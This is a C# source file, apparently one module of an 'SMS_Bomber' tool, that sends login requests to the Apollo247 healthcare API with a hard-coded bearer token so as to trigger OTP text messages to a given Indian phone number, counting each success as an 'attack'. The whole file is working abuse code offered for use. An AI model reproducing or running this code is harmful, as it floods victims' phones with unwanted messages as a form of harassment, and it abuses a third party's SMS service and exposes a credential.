using System;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Apollo247 : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Apollo247";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://webapi.apollo247.com/");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;

            var ReqBody = $"{{\"operationName\":\"Login\",\"variables\":{{\"mobileNumber\":\"+91{To}\"," +
                "\"loginType\":\"PATIENT\"},\"query\":\"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!)" +
                " {login(mobileNumber: $mobileNumber, loginType: $loginType) { status message loginId __typename}}\"}";

            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            { Content = new StringContent(ReqBody, Encoding.UTF8, "application/json") };
            AtkMSG.Headers.Add("authorization", "Bearer 3d1833da7020e0602165529446587434");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"status\":true")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
